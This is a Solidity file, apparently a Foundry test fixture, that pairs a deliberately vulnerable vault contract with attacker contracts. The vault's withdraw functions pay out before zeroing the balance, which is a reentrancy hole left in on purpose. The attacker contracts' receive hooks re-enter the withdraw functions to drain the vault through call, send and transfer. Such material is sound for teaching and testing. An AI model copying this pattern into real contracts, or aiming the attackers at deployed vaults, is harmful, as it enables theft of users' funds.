// SPDX-License-Identifier: GPL-3.0
pragma solidity >=0.6.2 <0.9.0;

import "forge-std/console2.sol";

contract VulnerableVault {
    mapping(address => uint256) public _balanceOf;

    function deposit() public payable {
        _balanceOf[msg.sender] += msg.value;
    }

    function withdrawTransfer() public {
        uint256 amount = _balanceOf[msg.sender];
        if (0 < amount) {
            console2.log("[VulnerableVault:withdrawTransfer] BeforeTransfer");
            payable(msg.sender).transfer(amount);
            console2.log("[VulnerableVault:withdrawTransfer] AfterTransfer");
            _balanceOf[msg.sender] = 0;
        }
    }

    function withdrawSend() public {
        uint256 amount = _balanceOf[msg.sender];
        if (0 < amount) {
            console2.log("[VulnerableVault:withdrawSend] BeforeSend");
            bool success = payable(msg.sender).send(amount);
            console2.log("[VulnerableVault:withdrawSend] AfterSend", success);
            _balanceOf[msg.sender] = 0;
        }
    }

    function withdrawCall() public {
        uint256 amount = _balanceOf[msg.sender];
        if (0 < amount) {
            console2.log("[VulnerableVault:withdrawCall] BeforeCall");
            (bool success, ) = msg.sender.call{value: amount}("");
            console2.log("[VulnerableVault:withdrawCall] AfterCall", success);
            _balanceOf[msg.sender] = 0;
        }
    }
}

contract Malicious {
    VulnerableVault _vault;

    receive() external payable {
        call_withdraw();
    }

    function call_withdraw() public virtual {}

    function call_deposit(address vaultAdr, uint256 amount) public {
        _vault = VulnerableVault(vaultAdr);
        _vault.deposit{value: amount}();
    }
}

contract MaliciousCall is Malicious {
    function call_withdraw() public override {
        _vault.withdrawCall();
    }
}

contract MaliciousSend is Malicious {
    function call_withdraw() public override {
        _vault.withdrawSend();
    }
}

contract MaliciousTransfer is Malicious {
    function call_withdraw() public override {
        _vault.withdrawTransfer();
    }
}
